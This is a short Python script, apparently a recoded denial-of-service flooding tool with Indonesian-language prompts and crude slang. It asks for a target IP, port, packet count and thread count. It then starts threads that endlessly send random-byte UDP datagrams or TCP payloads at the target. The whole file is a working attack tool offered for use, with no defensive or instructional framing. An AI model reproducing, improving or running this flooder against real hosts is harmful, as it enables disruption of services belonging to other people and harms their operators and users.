#!/usr/bin/env python3
#Code by LeeOn123 Recode Dikz
import random
import socket
import threading

print("--> Leon123 ReC0de By Dikz <--")
print("#-- Dikz Crot Kematian  --#")
ip = str(input(" IP TARGET LU:"))
port = int(input(" Port:"))
choice = str(input(" Yakin crot?(y/n):"))
times = int(input(" Jumlah Peju:"))
threads = int(input(" Crot Ahsiap:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[×]","[×]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Dikz Mengecrot")
		except:
			print("[!] Yah abiss")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET KEMATIAN")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
